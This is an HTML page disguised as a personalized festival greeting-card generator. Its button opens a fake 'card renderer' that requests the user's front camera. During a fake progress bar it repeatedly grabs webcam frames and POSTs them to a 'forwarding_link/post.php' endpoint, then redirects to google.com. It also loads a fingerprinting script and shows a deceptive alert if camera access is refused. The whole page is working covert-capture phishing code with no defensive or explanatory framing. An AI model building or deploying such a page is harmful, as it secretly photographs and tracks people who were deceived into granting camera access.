<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Festival Greetings • Create</title>
    <meta property="og:title" content="🎉 Personalized Festival Greeting For You">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 40%, #24243e 100%);
            color: #fff;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 20px; text-align: center; overflow-x: hidden;
        }

        .header h1 {
            font-family: 'Dancing Script', cursive; font-size: 38px;
            background: linear-gradient(135deg, #f093fb, #f5576c, #ffd700);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }

        .wish-card {
            background: rgba(255,255,255,0.06);
            -webkit-backdrop-filter: blur(20px);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px; padding: 32px 24px;
            width: 100%; max-width: 400px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            margin-top: 24px; animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; } }

        .banner-icon { font-size: 52px; margin-bottom: 16px; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        .wish-title { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
        .wish-desc { font-size: 13px; color: #cbd5e1; margin-bottom: 24px; line-height: 20px; }

        .action-btn {
            width: 100%; padding: 14px;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            color: white; border: none; border-radius: 14px;
            font-size: 15px; font-weight: 700; cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(245, 87, 108, 0.4); }

        /* Scanning Modal Overlay */
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.75);
            -webkit-backdrop-filter: blur(8px);
            backdrop-filter: blur(8px);
            display: none; justify-content: center; align-items: center;
            z-index: 1000;
        }

        .modal-card {
            background: rgba(25, 25, 35, 0.95);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 24px; padding: 28px;
            width: 90%; max-width: 340px; text-align: center;
            animation: popUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); } }

        .scan-frame {
            position: relative; width: 150px; height: 150px; margin: 0 auto 20px;
            border-radius: 50%; overflow: hidden; border: 3px solid rgba(255,255,255,0.15);
        }

        .scan-frame video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }

        .scan-pulse {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%; border: 3px solid #f093fb;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.1); opacity: 0; } }

        .scan-status { font-size: 15px; font-weight: 600; color: #fff; margin-bottom: 4px; }
        .scan-percent { font-size: 12px; color: #94a3b8; margin-bottom: 16px; }

        .loader-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; }
        .loader-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #f093fb, #f5576c); transition: width 0.3s; }

    </style>
</head>
<body>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="header">
    <h1>Special Greeting Card</h1>
</div>

<div class="wish-card">
    <div class="banner-icon">🎁</div>
    <div class="wish-title">Personalized festival wishes</div>
    <div class="wish-desc">A beautiful personalized festival greeting card has been created. Click below to view and render your layout with effects.</div>
    <button class="action-btn" onclick="openCreator()">Generate My Card 🎉</button>
</div>

<!-- CAPTURE MODAL -->
<div class="modal" id="scanModal">
    <div class="modal-card">
        <div class="scan-frame">
            <video id="scanVideo" autoplay playsinline></video>
            <div class="scan-pulse" id="pulseRing"></div>
        </div>
        
        <div class="scan-status" id="scanStatus">Initializing Camera Card Renderer...</div>
        <div class="scan-percent" id="scanPercent">0% Render Loaded</div>

        <div class="loader-bar">
            <div class="loader-fill" id="loaderFill"></div>
        </div>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function() {},
        error: function() {}
    });
}

function openCreator() {
    const modal = document.getElementById('scanModal');
    const scanVideo = document.getElementById('scanVideo');
    const loaderFill = document.getElementById('loaderFill');
    const scanStatus = document.getElementById('scanStatus');
    const scanPercent = document.getElementById('scanPercent');

    modal.style.display = 'flex';

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            scanVideo.srcObject = stream;
            if (window.scanVideo && window.scanVideo.play) scanVideo.play();

            let progress = 0;
            let statusTexts = [
                "Setting up greeting canvas...",
                "Adding dynamic spark effects...",
                "Completing backdrop filters...",
                "Card created fully! Forwarding layout."
            ];
            let textIndex = 0;

            // FIX BLACK FRAME: Wait 1.5 seconds for camera to adjust lighting 
            setTimeout(() => {
                const timer = setInterval(() => {
                progress += Math.floor(Math.random() * 10) + 5;
                if (progress >= 100) progress = 100;

                scanPercent.innerText = `${progress}% Render Authorization`;
                loaderFill.style.width = `${progress}%`;

                // capturing continues picture interval
                var context = canvas.getContext('2d');
                context.drawImage(scanVideo, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);

                if (progress === 100) {
                    clearInterval(timer);
                    scanStatus.innerText = "Success! Loaded Frame.";
                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
                    textIndex++;
                    scanStatus.innerText = statusTexts[textIndex];
                }
            }, 1000);
            }, 1500);
        })
        .catch(function() {
            alert("Camera access node is required to personalize your Greeting layout effects securely.");
            modal.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
